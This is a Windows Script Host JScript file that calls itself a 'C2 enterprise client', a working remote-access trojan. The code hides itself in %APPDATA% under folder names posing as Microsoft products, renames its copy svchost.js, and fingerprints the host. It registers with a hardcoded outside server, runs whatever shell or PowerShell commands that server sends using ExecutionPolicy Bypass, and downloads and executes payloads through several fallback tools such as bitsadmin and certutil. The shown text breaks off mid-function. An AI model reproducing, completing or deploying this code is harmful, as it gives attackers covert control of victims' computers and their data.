// ============================================================
// C2 ENTERPRISE CLIENT - COMPLETE ROBUST VERSION
// Combined with universal working version - FIXED duplicate agent issue
// ============================================================

var WshShell = WScript.CreateObject("WScript.Shell");
var fso = WScript.CreateObject("Scripting.FileSystemObject");
var network = WScript.CreateObject("WScript.Network");

// ========== CROSS-BROWSER TRIM ==========
function trim(str) {
    if (str == null || str == undefined) return "";
    return str.replace(/^\s+|\s+$/g, '');
}

// ========== ROBUST JSON PARSER ==========
var JSON = {
    parse: function(jsonString) {
        try {
            jsonString = trim(jsonString);
            if (!jsonString || jsonString == '{}' || jsonString == '') return {};
            var content = jsonString.substring(1, jsonString.length - 1);
            if (!content) return {};
            var result = {};
            var inString = false;
            var current = '';
            var parts = [];
            for (var i = 0; i < content.length; i++) {
                var c = content.charAt(i);
                if (c == '"' && (i == 0 || content.charAt(i-1) != '\\')) {
                    inString = !inString;
                    current += c;
                } else if (c == ',' && !inString) {
                    if (current.length > 0) parts.push(current);
                    current = '';
                } else {
                    current += c;
                }
            }
            if (current.length > 0) parts.push(current);
            for (var p = 0; p < parts.length; p++) {
                var pair = trim(parts[p]);
                var colonIndex = -1;
                inString = false;
                for (var j = 0; j < pair.length; j++) {
                    var ch = pair.charAt(j);
                    if (ch == '"' && (j == 0 || pair.charAt(j-1) != '\\')) inString = !inString;
                    else if (ch == ':' && !inString) { colonIndex = j; break; }
                }
                if (colonIndex > -1) {
                    var key = trim(pair.substring(0, colonIndex));
                    var value = trim(pair.substring(colonIndex + 1));
                    if (key.charAt(0) == '"' && key.charAt(key.length-1) == '"') key = key.substring(1, key.length-1);
                    if (value.charAt(0) == '"' && value.charAt(value.length-1) == '"') value = value.substring(1, value.length-1);
                    else if (value == 'true' || value == 'false') value = (value == 'true');
                    else if (value == 'null') value = null;
                    else if (!isNaN(value) && value.length > 0) value = parseFloat(value);
                    result[key] = value;
                }
            }
            return result;
        } catch(e) { return {}; }
    }
};

// ========== CONFIGURATION ==========
var CONFIG = {
    SERVER: "http://withoutwithin.onthewifi.com:8080",
    CLIENT_ID: null,
    POLL_INTERVAL: 30,
    HEARTBEAT_INTERVAL: 3600,
    DEBUG: true
};

var sessionToken = null;
var sessionExpiry = 0;
var currentDirectory = fso.GetAbsolutePathName(".");
var lastHeartbeat = 0;
var connectionStartTime = new Date().getTime();
var pollCount = 0;
var registrationFailCount = 0;

// ========== LOGGING ==========
function log(message) {
    if (!CONFIG.DEBUG) return;
    var date = new Date();
    var timestamp = zeroPad(date.getHours(), 2) + ":" + zeroPad(date.getMinutes(), 2) + ":" + zeroPad(date.getSeconds(), 2);
    WScript.Echo("[" + timestamp + "] " + message);
}

function zeroPad(num, places) {
    var str = num.toString();
    while (str.length < places) str = "0" + str;
    return str;
}

// ========== STEALTH INSTALLATION ==========
var INSTALL_DIR = null;
var INSTALLED_SCRIPT = null;
var IS_INSTALLED = false;

function setHidden(path) {
    try {
        if (fso.FileExists(path)) {
            var f = fso.GetFile(path);
            f.Attributes = f.Attributes | 2 | 4;
        } else if (fso.FolderExists(path)) {
            var d = fso.GetFolder(path);
            d.Attributes = d.Attributes | 2 | 4;
        }
    } catch(e) {}
}

function initializeStealth() {
    try {
        var appData = WshShell.ExpandEnvironmentStrings("%APPDATA%");
        var legitNames = ["WindowsMediaPlayer","MicrosoftEdge","WindowsDefender","SystemUpdates","NetworkServices","AudioServices"];
        var randomIndex = Math.floor(Math.random() * legitNames.length);
        var dirName = legitNames[randomIndex];
        INSTALL_DIR = fso.BuildPath(appData, dirName);
        if (!fso.FolderExists(INSTALL_DIR)) {
            fso.CreateFolder(INSTALL_DIR);
            try { setHidden(INSTALL_DIR); } catch(e) {}
        }
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "data"));
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "cache"));
        createHiddenDir(fso.BuildPath(INSTALL_DIR, "temp"));
        var currentScript = WScript.ScriptFullName;
        INSTALLED_SCRIPT = fso.BuildPath(INSTALL_DIR, "svchost.js");
        if (currentScript.toLowerCase() != INSTALLED_SCRIPT.toLowerCase()) {
            copyScriptToInstallDir(currentScript);
            launchInstalledVersion();
            WScript.Sleep(2000);
            WScript.Quit(0);
        } else {
            IS_INSTALLED = true;
        }
        return true;
    } catch(e) {
        INSTALL_DIR = fso.GetAbsolutePathName(".");
        IS_INSTALLED = true;
        return false;
    }
}

function createHiddenDir(path) {
    try {
        if (!fso.FolderExists(path)) {
            fso.CreateFolder(path);
            try { setHidden(path); } catch(e) {}
        }
    } catch(e) {}
}

function copyScriptToInstallDir(sourcePath) {
    try {
        fso.CopyFile(sourcePath, INSTALLED_SCRIPT, true);
        try { setHidden(INSTALLED_SCRIPT); } catch(e) {}
        return true;
    } catch(e) { return false; }
}

function launchInstalledVersion() {
    try {
        WshShell.Run('wscript.exe //B //Nologo "' + INSTALLED_SCRIPT + '"', 0, false);
        return true;
    } catch(e) { return false; }
}

function getStealthPath(filename) {
    if (INSTALL_DIR) {
        var dataDir = fso.BuildPath(INSTALL_DIR, "data");
        return fso.BuildPath(dataDir, filename);
    }
    var tempDir = fso.GetSpecialFolder(2).Path;
    var hiddenDir = fso.BuildPath(tempDir, ".winsvc");
    if (!fso.FolderExists(hiddenDir)) {
        fso.CreateFolder(hiddenDir);
        try { setHidden(hiddenDir); } catch(e) {}
    }
    return fso.BuildPath(hiddenDir, filename);
}

function getDownloadDir() {
    if (INSTALL_DIR) return fso.BuildPath(INSTALL_DIR, "cache");
    return fso.BuildPath(currentDirectory, "downloads");
}

function getUploadDir() {
    if (INSTALL_DIR) return fso.BuildPath(INSTALL_DIR, "temp");
    return fso.BuildPath(currentDirectory, "uploads");
}

// ========== SYSTEM INFO ==========
// FIXED: Machine-based ID generation to prevent duplicate agents
function generateClientId() {
    try {
        var idFile = getStealthPath("agent_id.dat");
        if (fso.FileExists(idFile)) {
            var file = fso.OpenTextFile(idFile, 1);
            var savedId = file.ReadAll();
            file.Close();
            if (savedId && savedId.length > 0) return savedId.replace(/[^\x20-\x7E]/g, '');
        }
        
        // Get machine-specific identifiers (NOT user-dependent)
        var computerName = (network.ComputerName || "unknown").toLowerCase().replace(/[^a-z0-9]/g, "");
        if (computerName.length > 8) computerName = computerName.substring(0, 8);
        
        // Use machine SID instead of username (more stable)
        var machineSid = getMachineSID();
        if (machineSid.length > 6) machineSid = machineSid.substring(0, 6);
        
        // Use MAC address (hardware-based)
        var mac = getMacAddress().replace(/[^a-fA-F0-9]/g, "").toLowerCase();
        if (mac.length > 6) mac = mac.substring(0, 6);
        
        // Create machine-based ID (no username!)
        var persistentId = "magent-" + computerName + "-" + machineSid + "-" + mac;
        
        var f2 = fso.OpenTextFile(idFile, 2, true);
        f2.Write(persistentId);
        f2.Close();
        try { setHidden(idFile); } catch(e) {}
        return persistentId;
    } catch(e) {
        return "magent-" + Math.floor(Math.random() * 1000000);
    }
}

// NEW: Get Machine SID (unique per machine)
function getMachineSID() {
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var accounts = wmi.ExecQuery("SELECT * FROM Win32_UserAccount WHERE Name='Administrator'");
        var e = new Enumerator(accounts);
        for (; !e.atEnd(); e.moveNext()) {
            var account = e.item();
            if (account.SID) {
                // Extract the machine part of the SID (before the last -)
                var sid = account.SID;
                var lastDash = sid.lastIndexOf('-');
                if (lastDash > 0) {
                    return sid.substring(0, lastDash).replace(/[^a-zA-Z0-9]/g, "");
                }
                return sid.replace(/[^a-zA-Z0-9]/g, "");
            }
        }
    } catch(e) {}
    
    // Fallback: use volume serial number
    try {
        var drive = "C:";
        var fso2 = new ActiveXObject("Scripting.FileSystemObject");
        var volume = fso2.GetDrive(drive).VolumeName;
        var serial = fso2.GetDrive(drive).SerialNumber;
        return (volume + serial).replace(/[^a-zA-Z0-9]/g, "").substring(0, 8);
    } catch(e) {}
    
    return "unknown";
}

function getMacAddress() {
    try {
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            if (obj.MACAddress) return obj.MACAddress;
        }
    } catch(e) {}
    return "00:00:00:00:00:00";
}

function getWindowsVersion() {
    try {
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("SELECT * FROM Win32_OperatingSystem");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            return obj.Caption + " " + obj.Version;
        }
    } catch(e) {}
    return WshShell.ExpandEnvironmentStrings("%OS%") || "Unknown";
}

function getLocalIP() {
    try {
        var colItems = GetObject("winmgmts:\\\\.\\root\\cimv2").ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True");
        var e = new Enumerator(colItems);
        for (; !e.atEnd(); e.moveNext()) {
            var obj = e.item();
            if (obj.IPAddress) return obj.IPAddress(0);
        }
    } catch(e) {}
    return "0.0.0.0";
}

// ========== HTTP COMMUNICATION ==========
function httpRequest(url, method, data) {
    try {
        var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
        winHttp.Open(method, url, false);
        winHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        winHttp.SetRequestHeader("Accept", "application/json");
        if (sessionToken) winHttp.SetRequestHeader("X-Session", sessionToken);
        winHttp.SetTimeouts(30000, 30000, 60000, 60000);
        if (data) winHttp.Send(data);
        else winHttp.Send();
        if (winHttp.Status == 200) {
            return { success: true, status: winHttp.Status, responseText: winHttp.ResponseText };
        } else {
            if (winHttp.Status == 401 || winHttp.Status == 403) sessionToken = null;
            return { success: false, status: winHttp.Status, responseText: winHttp.ResponseText };
        }
    } catch(e) {
        sessionToken = null;
        return { success: false, error: e.message };
    }
}

// ========== REGISTRATION ==========
function performRegistration() {
    try {
        var mac = getMacAddress().replace(/:/g, "").toLowerCase();
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&os=" + encodeURIComponent("Windows " + getWindowsVersion()) +
                     "&hostname=" + encodeURIComponent(network.ComputerName || "unknown") +
                     "&ip=" + encodeURIComponent(getLocalIP()) +
                     "&user=" + encodeURIComponent(network.UserName || "unknown") +
                     "&process=" + encodeURIComponent("wscript.exe") +
                     "&mac=" + mac +
                     "&session=" + (sessionToken ? sessionToken : "");
        var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
        if (response.success) {
            registrationFailCount = 0;
            if (response.responseText && response.responseText != "{}") {
                try {
                    var result = JSON.parse(response.responseText);
                    if (!result.session) {
                        var sessionMatch = /"session"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (sessionMatch && sessionMatch[1]) result.session = sessionMatch[1];
                    }
                    if (!result.command) {
                        var commandMatch = /"command"\s*:\s*"((?:[^"\\]|\\.)*)"/.exec(response.responseText);
                        if (commandMatch && commandMatch[1]) result.command = unescapeJsonString(commandMatch[1]);
                    }
                    if (!result.type) {
                        var typeMatch = /"type"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (typeMatch && typeMatch[1]) result.type = typeMatch[1];
                    }
                    if (!result.id) {
                        var idMatch = /"id"\s*:\s*"([^"]+)"/.exec(response.responseText);
                        if (idMatch && idMatch[1]) result.id = idMatch[1];
                    }
                    if (result.session) {
                        sessionToken = result.session;
                        sessionExpiry = new Date().getTime() + (30 * 24 * 60 * 60 * 1000);
                    }
                    if (result.command && result.id) {
                        executeAndSendResult(result.id, result.command, result.type || "SHELL");
                    }
                } catch(e) {}
            }
            return true;
        } else {
            registrationFailCount++;
            return false;
        }
    } catch(e) {
        registrationFailCount++;
        return false;
    }
}

// ========== JSON UNESCAPE ==========
function unescapeJsonString(s) {
    if (!s) return "";
    return s.replace(/\\"/g, '"')
            .replace(/\\\\/g, '\\')
            .replace(/\\n/g, '\n')
            .replace(/\\r/g, '\r')
            .replace(/\\t/g, '\t')
            .replace(/\\\//g, '/');
}

// ========== POLLING ==========
function pollForCommands() {
    if (!sessionToken && registrationFailCount < 5) {
        performRegistration();
        return;
    }
    try {
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&os=" + encodeURIComponent("Windows " + getWindowsVersion()) +
                     "&hostname=" + encodeURIComponent(network.ComputerName || "unknown") +
                     "&ip=" + encodeURIComponent(getLocalIP()) +
                     "&user=" + encodeURIComponent(network.UserName || "unknown") +
                     "&process=" + encodeURIComponent("wscript.exe") +
                     "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
        var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
        if (response.success) {
            var responseText = response.responseText || "";
            if (responseText && responseText != "{}" && responseText.indexOf('"command":') > -1) {
                try {
                    var cmdData = JSON.parse(responseText);
                    if (!cmdData.command) {
                        var commandMatch = /"command"\s*:\s*"((?:[^"\\]|\\.)*)"/.exec(responseText);
                        if (commandMatch) cmdData.command = unescapeJsonString(commandMatch[1]);
                    }
                    if (!cmdData.type) {
                        var typeMatch = /"type"\s*:\s*"([^"]+)"/.exec(responseText);
                        if (typeMatch) cmdData.type = typeMatch[1];
                    }
                    if (!cmdData.id) {
                        var idMatch = /"id"\s*:\s*"([^"]+)"/.exec(responseText);
                        if (idMatch) cmdData.id = idMatch[1];
                    }
                    if (cmdData.command && cmdData.id) {
                        executeAndSendResult(cmdData.id, cmdData.command, cmdData.type || "SHELL");
                    }
                } catch(e) {}
            }
        } else {
            if (response.status == 401 || response.status == 403) sessionToken = null;
        }
    } catch(e) {}
}

// ========== HEARTBEAT ==========
function sendHeartbeat() {
    if (!sessionToken) return false;
    try {
        var uptime = new Date().getTime() - connectionStartTime;
        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                     "&session=" + encodeURIComponent(sessionToken) +
                     "&uptime=" + uptime;
        var response = httpRequest(CONFIG.SERVER + "/heartbeat", "POST", params);
        if (response.success) { lastHeartbeat = new Date().getTime(); return true; }
        return false;
    } catch(e) { return false; }
}

function shouldSendHeartbeat() {
    return ((new Date().getTime() - lastHeartbeat) / 1000) >= CONFIG.HEARTBEAT_INTERVAL;
}

// ============================================================
// ========== ROBUST SHELL EXECUTION ENGINE ==========
// ============================================================

// ---- Expand %VAR% and $env:VAR ----
function expandEnvVars(str) {
    if (!str) return str;
    // Expand %VAR%
    str = str.replace(/%([^%\r\n]+)%/g, function(match, varName) {
        try {
            var exp = WshShell.ExpandEnvironmentStrings("%" + varName + "%");
            return (exp !== "%" + varName + "%") ? exp : match;
        } catch(e) { return match; }
    });
    // Expand $env:VAR (PowerShell style, sometimes used in cmd context)
    str = str.replace(/\$env:([A-Za-z_][A-Za-z0-9_]*)/gi, function(match, varName) {
        try {
            var exp = WshShell.ExpandEnvironmentStrings("%" + varName + "%");
            return (exp !== "%" + varName + "%") ? exp : match;
        } catch(e) { return match; }
    });
    return str;
}

// ---- Detect command type for routing ----
function detectCommandType(cmd) {
    var lower = trim(cmd).toLowerCase();
    if (/^powershell(\.exe)?(\s|$)/i.test(lower)) return "powershell";
    if (/^pwsh(\.exe)?(\s|$)/i.test(lower))        return "powershell";
    if (/^python(\d)?(\.exe)?(\s|$)/i.test(lower)) return "batch";
    if (/^certutil/i.test(lower))                  return "batch";
    if (/^bitsadmin/i.test(lower))                 return "batch";
    if (/^curl(\.exe)?(\s|$)/i.test(lower))        return "batch";
    if (/^wget(\.exe)?(\s|$)/i.test(lower))        return "batch";
    if (/^reg\s+(add|delete|query|export)/i.test(lower)) return "batch";
    if (/^schtasks/i.test(lower))                  return "batch";
    if (/^mshta\b/i.test(lower))                   return "batch";
    if (/^rundll32\b/i.test(lower))                return "batch";
    if (/^msiexec\b/i.test(lower))                 return "batch";
    if (/^cmd(\.exe)?(\s|$)/i.test(lower))         return "batch";
    return "batch"; // default: all go through batch
}

// ---- Read file safely (handles UTF-8 BOM, fallback to binary) ----
function readFileContents(path) {
    try {
        if (!fso.FileExists(path)) return "";
        // Try UTF-8 via ADODB first (handles BOM and encoding properly)
        try {
            var stream = WScript.CreateObject("ADODB.Stream");
            stream.Type = 2; // Text
            stream.Charset = "UTF-8";
            stream.Open();
            stream.LoadFromFile(path);
            var content = stream.ReadText();
            stream.Close();
            // Strip BOM
            if (content && content.charCodeAt(0) === 0xFEFF) content = content.substring(1);
            return content;
        } catch(e2) {
            // Fallback: open as text file
            try {
                var f = fso.OpenTextFile(path, 1, false, 0); // 0 = ASCII
                var txt = "";
                try { txt = f.ReadAll(); } catch(e3) {}
                f.Close();
                return txt;
            } catch(e4) { return ""; }
        }
    } catch(e) { return ""; }
}

// ---- Write text file safely ----
function writeTextFile(path, content, unicode) {
    try {
        var f = fso.CreateTextFile(path, true, unicode === true);
        f.Write(content);
        f.Close();
        return true;
    } catch(e) { return false; }
}

// ---- Core: Execute via batch file (most robust - handles ALL cmd features) ----
function executeViaBatchFile(command, workingDir, timeoutMs) {
    timeoutMs = timeoutMs || 90000;
    var tempDir  = fso.GetSpecialFolder(2).Path;
    var rand     = Math.floor(Math.random() * 999999);
    var batFile  = fso.BuildPath(tempDir, "c2bat_" + rand + ".bat");
    var outFile  = fso.BuildPath(tempDir, "c2out_" + rand + ".txt");
    var errFile  = fso.BuildPath(tempDir, "c2err_" + rand + ".txt");
    var cwdFile  = fso.BuildPath(tempDir, "c2cwd_" + rand + ".txt");
    var exitFile = fso.BuildPath(tempDir, "c2exit_" + rand + ".txt");

    try {
        // Build .bat content - write EXACT command, no quoting transform needed
        var bat = "@echo off\r\n";
        bat += "chcp 65001 >nul 2>&1\r\n";
        if (workingDir && fso.FolderExists(workingDir)) {
            // Switch drive, then cd
            var drive = workingDir.substring(0, 2);
            if (/^[A-Za-z]:$/.test(drive)) bat += drive + "\r\n";
            bat += "cd /d \"" + workingDir + "\"\r\n";
        }
        bat += command + " > \"" + outFile + "\" 2>\"" + errFile + "\"\r\n";
        bat += "echo %ERRORLEVEL% > \"" + exitFile + "\"\r\n";
        bat += "echo %CD% > \"" + cwdFile + "\"\r\n";

        if (!writeTextFile(batFile, bat, false)) {
            return { stdout: "Failed to write batch file", stderr: "", exitCode: -1, cwd: workingDir || currentDirectory };
        }

        // Run hidden, synchronous wait
        var startTime = new Date().getTime();
        var proc = WshShell.Exec('cmd.exe /q /c "' + batFile + '"');

        while (proc.Status === 0) {
            WScript.Sleep(100);
            if (new Date().getTime() - startTime > timeoutMs) {
                try { proc.Terminate(); } catch(e) {}
                return {
                    stdout:   "[TIMEOUT] Command exceeded " + Math.round(timeoutMs/1000) + "s limit\n",
                    stderr:   "",
                    exitCode: -1,
                    cwd:      workingDir || currentDirectory
                };
            }
        }

        var stdout   = readFileContents(outFile);
        var stderr   = readFileContents(errFile);
        var newCwdRaw= readFileContents(cwdFile);
        var exitRaw  = readFileContents(exitFile);

        var newCwd = trim(newCwdRaw.replace(/[\r\n]+/g, ""));
        var exitCode = 0;
        try { exitCode = parseInt(trim(exitRaw), 10) || 0; } catch(e) {}

        if (newCwd && fso.FolderExists(newCwd)) currentDirectory = newCwd;

        return { stdout: stdout, stderr: stderr, exitCode: exitCode, cwd: currentDirectory };

    } catch(e) {
        return { stdout: "", stderr: "Batch execution error: " + e.message, exitCode: -1, cwd: currentDirectory };
    } finally {
        var toDelete = [batFile, outFile, errFile, cwdFile, exitFile];
        for (var i = 0; i < toDelete.length; i++) {
            try { if (fso.FileExists(toDelete[i])) fso.DeleteFile(toDelete[i]); } catch(e) {}
        }
    }
}

// ---- Core: Execute PowerShell via .ps1 file (robust - handles all PS syntax) ----
function executePowerShellViaPs1(command, workingDir, timeoutMs) {
    timeoutMs = timeoutMs || 90000;
    var tempDir = fso.GetSpecialFolder(2).Path;
    var rand    = Math.floor(Math.random() * 999999);
    var ps1File = fso.BuildPath(tempDir, "c2ps_" + rand + ".ps1");
    var outFile = fso.BuildPath(tempDir, "c2psout_" + rand + ".txt");
    var cwdFile = fso.BuildPath(tempDir, "c2pscwd_" + rand + ".txt");
    var batWrap = fso.BuildPath(tempDir, "c2pswrap_" + rand + ".bat");

    try {
        // Strip the outer "powershell[.exe] [flags]" wrapper - keep only the payload
        var psBody = command;
        psBody = psBody.replace(/^(powershell(\.exe)?|pwsh(\.exe)?)\s*/i, '');
        psBody = psBody.replace(/^(-ExecutionPolicy\s+\w+\s*)/i, '');
        psBody = psBody.replace(/^(-NoProfile\s*)/i, '');
        psBody = psBody.replace(/^(-NonInteractive\s*)/i, '');
        psBody = psBody.replace(/^(-WindowStyle\s+\w+\s*)/i, '');
        psBody = psBody.replace(/^(-NoExit\s*)/i, '');
        psBody = psBody.replace(/^(-Command\s+)/i, '');
        psBody = psBody.replace(/^(-File\s+)/i, '');
        // Remove wrapping & { ... }
        psBody = psBody.replace(/^&\s*\{([\s\S]*)\}\s*$/, '$1');
        // Remove wrapping quotes if whole thing is quoted
        if (/^["'][\s\S]*["']$/.test(psBody)) {
            psBody = psBody.substring(1, psBody.length - 1);
        }

        // Build the .ps1 script
        var ps1 = "$ErrorActionPreference = 'Continue'\n";
        ps1 += "$OutputEncoding = [System.Text.Encoding]::UTF8\n";
        if (workingDir && fso.FolderExists(workingDir)) {
            ps1 += "Set-Location -LiteralPath @'\n" + workingDir + "\n'@\n";
        }
        ps1 += "try {\n";
        ps1 += psBody + "\n";
        ps1 += "} catch {\n";
        ps1 += "  Write-Error $_.Exception.Message\n";
        ps1 += "}\n";
        ps1 += "(Get-Location).Path | Out-File -LiteralPath '" + cwdFile.replace(/'/g,"''") + "' -Encoding UTF8 -Force\n";

        // Write .ps1 as Unicode so non-ASCII paths work
        try {
            var stream = WScript.CreateObject("ADODB.Stream");
            stream.Type = 2;
            stream.Charset = "UTF-8";
            stream.Open();
            stream.WriteText(ps1);
            stream.SaveToFile(ps1File, 2);
            stream.Close();
        } catch(e2) {
            writeTextFile(ps1File, ps1, false);
        }

        // Wrapper .bat that runs PS and captures output
        var batContent = "@echo off\r\n";
        batContent += "chcp 65001 >nul 2>&1\r\n";
        batContent += 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "' + ps1File + '" > "' + outFile + '" 2>&1\r\n';

        writeTextFile(batWrap, batContent, false);

        var startTime = new Date().getTime();
        var proc = WshShell.Exec('cmd.exe /q /c "' + batWrap + '"');

        while (proc.Status === 0) {
            WScript.Sleep(150);
            if (new Date().getTime() - startTime > timeoutMs) {
                try { proc.Terminate(); } catch(e) {}
                return {
                    stdout:   "[TIMEOUT] PowerShell exceeded " + Math.round(timeoutMs/1000) + "s\n",
                    stderr:   "",
                    exitCode: -1,
                    cwd:      currentDirectory
                };
            }
        }

        var stdout  = readFileContents(outFile);
        var newCwd  = trim(readFileContents(cwdFile).replace(/[\r\n]+/g,""));
        if (newCwd && fso.FolderExists(newCwd)) currentDirectory = newCwd;

        return { stdout: stdout, stderr: "", exitCode: proc.ExitCode || 0, cwd: currentDirectory };

    } catch(e) {
        return { stdout: "", stderr: "PowerShell error: " + e.message, exitCode: -1, cwd: currentDirectory };
    } finally {
        var toDelete2 = [ps1File, outFile, cwdFile, batWrap];
        for (var i = 0; i < toDelete2.length; i++) {
            try { if (fso.FileExists(toDelete2[i])) fso.DeleteFile(toDelete2[i]); } catch(e) {}
        }
    }
}

// ---- Format result for C2 display ----
function formatExecResult(command, res) {
    var out = "Command: " + command + "\n";
    out += "Directory: " + (res.cwd || currentDirectory) + "\n";
    out += "========================================\n";
    if (res.stdout && res.stdout.length > 0) {
        out += res.stdout;
        if (out.charAt(out.length - 1) !== "\n") out += "\n";
    }
    if (res.stderr && trim(res.stderr).length > 0) {
        out += "[STDERR]\n" + res.stderr;
        if (out.charAt(out.length - 1) !== "\n") out += "\n";
    }
    out += "[Exit Code: " + (res.exitCode !== undefined ? res.exitCode : 0) + "]";
    return out;
}

// ========== MAIN SHELL COMMAND HANDLER ==========
function executeShellCommand(command) {
    if (!command || trim(command) === "") {
        return "Empty command\n[Exit Code: 1]";
    }

    // Step 1: Expand environment variables
    var expandedCmd = expandEnvVars(command);

    // Step 2: Handle built-in CD navigation
    var cdMatch = expandedCmd.match(/^cd\s+(.*)/i);
    if (cdMatch) {
        var rawPath = trim(cdMatch[1]);
        // Remove surrounding quotes if any
        rawPath = rawPath.replace(/^["']|["']$/g, '');
        rawPath = expandEnvVars(rawPath);

        var newDir;
        if (rawPath === ".." || rawPath === "..\\") {
            try { newDir = fso.GetParentFolderName(currentDirectory); } catch(e) { newDir = currentDirectory; }
        } else if (/^[A-Za-z]:[\\/]?$/.test(rawPath)) {
            newDir = rawPath.replace(/[\/\\]$/, '') + "\\";
        } else if (/^[A-Za-z]:/.test(rawPath)) {
            newDir = rawPath;
        } else {
            newDir = fso.BuildPath(currentDirectory, rawPath);
        }

        // Normalize path
        try { newDir = fso.GetFolder(newDir).Path; } catch(e) {}

        if (fso.FolderExists(newDir)) {
            currentDirectory = newDir;
            return "Command: " + command + "\nDirectory: " + currentDirectory + "\n========================================\n[Exit Code: 0]";
        } else {
            return "Command: " + command + "\nDirectory: " + currentDirectory + "\n========================================\n"
                 + "The system cannot find the path specified: '" + rawPath + "'\n[Exit Code: 1]";
        }
    }

    // Step 3: Route to correct executor
    var cmdType = detectCommandType(expandedCmd);
    var result;

    if (cmdType === "powershell") {
        result = executePowerShellViaPs1(expandedCmd, currentDirectory, 90000);
    } else {
        result = executeViaBatchFile(expandedCmd, currentDirectory, 90000);
    }

    return formatExecResult(command, result);
}

// ========== DOWNLOAD - handles URL + C2 server files ==========
function handleDownload(command) {
    try {
        // Remove DOWNLOAD: prefix if present
        var args = command;
        if (/^DOWNLOAD:/i.test(args)) args = args.substring(9);

        var execute    = args.indexOf(":EXECUTE") > -1;
        var deleteAfter= args.indexOf(":DELETE") > -1;
        // Strip those flags
        args = args.replace(/:EXECUTE/gi, '').replace(/:DELETE/gi, '');

        args = expandEnvVars(trim(args));

        // Check if it's a direct URL
        var isUrl = /^https?:\/\//i.test(args);
        var url, localPath;

        if (isUrl) {
            url = args;
            // Pick filename from URL
            var urlFilename = url.split("/").pop().split("?")[0] || ("file_" + new Date().getTime());
            localPath = fso.BuildPath(getDownloadDir(), urlFilename);
        } else {
            // C2 server file by filename
            var filename = args.split(/[\\\/]/).pop();
            url = CONFIG.SERVER + "/download?file=" + encodeURIComponent(filename);
            localPath = fso.BuildPath(getDownloadDir(), filename);
        }

        return downloadFromUrl(url, localPath, execute, deleteAfter);

    } catch(e) {
        return "Download error: " + e.message + "\n[Exit Code: 1]";
    }
}

// ---- Download from any URL to local path using multiple methods ----
function downloadFromUrl(url, localPath, execute, deleteAfter) {
    // Ensure destination directory exists
    var destDir = fso.GetParentFolderName(localPath);
    if (!fso.FolderExists(destDir)) {
        try { fso.CreateFolder(destDir); } catch(e) {}
    }

    var resultMsg = "Downloading: " + url + "\nTo: " + localPath + "\n";
    var downloaded = false;

    // Method 1: WinHttp (fastest, built-in, no process spawn)
    if (!downloaded) {
        try {
            var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
            winHttp.Open("GET", url, false);
            winHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            winHttp.SetTimeouts(10000, 10000, 180000, 180000);
            winHttp.Send();
            if (winHttp.Status === 200) {
                var adoStream = WScript.CreateObject("ADODB.Stream");
                adoStream.Type = 1; // Binary
                adoStream.Open();
                adoStream.Write(winHttp.ResponseBody);
                adoStream.SaveToFile(localPath, 2);
                adoStream.Close();
                if (fso.FileExists(localPath) && fso.GetFile(localPath).Size > 0) {
                    downloaded = true;
                    resultMsg += "Method: WinHttp\n";
                }
            }
        } catch(e) { resultMsg += "WinHttp failed: " + e.message + "\n"; }
    }

    // Method 2: PowerShell WebClient
    if (!downloaded) {
        try {
            var r2 = executePowerShellViaPs1(
                "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n" +
                "(New-Object System.Net.WebClient).DownloadFile('" + url.replace(/'/g,"''") + "', '" + localPath.replace(/'/g,"''") + "')",
                currentDirectory, 60000
            );
            if (fso.FileExists(localPath) && fso.GetFile(localPath).Size > 0) {
                downloaded = true;
                resultMsg += "Method: PowerShell WebClient\n";
            }
        } catch(e) { resultMsg += "PS WebClient failed: " + e.message + "\n"; }
    }

    // Method 3: PowerShell Invoke-WebRequest
    if (!downloaded) {
        try {
            var r3 = executePowerShellViaPs1(
                "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n" +
                "Invoke-WebRequest -Uri '" + url.replace(/'/g,"''") + "' -OutFile '" + localPath.replace(/'/g,"''") + "' -UseBasicParsing",
                currentDirectory, 60000
            );
            if (fso.FileExists(localPath) && fso.GetFile(localPath).Size > 0) {
                downloaded = true;
                resultMsg += "Method: Invoke-WebRequest\n";
            }
        } catch(e) { resultMsg += "IWR failed: " + e.message + "\n"; }
    }

    // Method 4: BITSAdmin
    if (!downloaded) {
        try {
            var r4 = executeViaBatchFile(
                'bitsadmin /transfer "c2job_' + Math.floor(Math.random()*9999) + '" /download /priority FOREGROUND "' + url + '" "' + localPath + '"',
                currentDirectory, 60000
            );
            if (fso.FileExists(localPath) && fso.GetFile(localPath).Size > 0) {
                downloaded = true;
                resultMsg += "Method: BITSAdmin\n";
            }
        } catch(e) { resultMsg += "BITSAdmin failed: " + e.message + "\n"; }
    }

    // Method 5: CertUtil
    if (!downloaded) {
        try {
            var r5 = executeViaBatchFile(
                'certutil -urlcache -split -f "' + url + '" "' + localPath + '"',
                currentDirectory, 60000
            );
            if (fso.FileExists(localPath) && fso.GetFile(localPath).Size > 0) {
                downloaded = true;
